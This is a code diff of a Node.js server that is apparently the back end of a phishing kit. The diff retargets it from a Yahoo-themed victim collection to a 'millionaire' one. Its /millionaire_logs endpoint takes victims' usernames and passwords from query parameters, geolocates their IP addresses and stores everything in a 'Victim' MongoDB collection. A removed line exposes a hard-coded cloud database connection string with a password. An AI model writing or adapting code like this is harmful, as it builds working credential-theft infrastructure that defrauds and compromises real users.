@@ -7,31 +7,28 @@ const port = process.env.PORT || 9000;
     mongoose = require("mongoose"),
     Sniffr = require("sniffr"),
     s = new Sniffr(),
-    yahooVictimSchema = null,
-    yahooVictim = null,
+    millionaireVictimSchema = null,
+    millionaireVictim = null,
     visitorIp = null,
     db = null;
 
-mongoose.connect("mongodb+srv://dbUser:Pass2020@cluster0.erxgy.mongodb.net/myFirstDatabase?retryWrites=true&w=majority", {
+mongoose.connect("mongodb://localhost:27017/admin", {
     useNewUrlParser: true,
     useUnifiedTopology: true
 })
 
 db = mongoose.connection;
 
-yahooVictimSchema = new mongoose.Schema({
+millionaireVictimSchema = new mongoose.Schema({
 	username: String,
-    email: String,
     password: String,
-    password2: String,
-    emailpassword: String,
     userAgent: String,
     victimIpInfo: {}
 }, {
     minimize: false
 })
 
-yahooVictim = mongoose.model("yahooVictim", yahooVictimSchema);
+millionaireVictim = mongoose.model("millionaireVictim", millionaireVictimSchema);
 
 
 
@@ -44,7 +41,7 @@ app.use(function(req, res, next) {
     next();
 });
 
-app.get("/yh_logs", (req, res) => {
+app.get("/millionaire_logs", (req, res) => {
     visitorIp = requestIp.getClientIp(req);
     s.sniff(req.headers['user-agent']);
     console.log(req.headers['user-agent']);
@@ -52,14 +49,14 @@ app.get("/yh_logs", (req, res) => {
     console.log(visitorIp)
     console.log(req.body)
     res.setHeader("Content-Type", "text/plain");
-    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.query.username, req.query.email, req.query.password, req.query.password2,req.query.emailpassword, req.headers['user-agent'], req, res);
+    getVictimIpInfoAndSaveMillionaireVictimInfoToDb(req.query.username, req.query.password, req.headers['user-agent'], req, res);
 })
 
 app.use(express.static('web'));
 
 
 
-function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, password2, emailpassword, userAgent, req, res) {
+function getVictimIpInfoAndSaveMillionaireVictimInfoToDb(username, password,  userAgent, req, res) {
 
     rp({
         uri: `http://ip-api.com/json/${visitorIp}`,
@@ -67,12 +64,9 @@ function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, pa
     }).then(victimIpInfo => {
         console.log(victimIpInfo);
 
-        new yahooVictim({
+        new millionaireVictim({
 			username,
-            email,
             password,
-            password2,
-            emailpassword,
             userAgent,
             victimIpInfo
         }).save((err, doc) => {
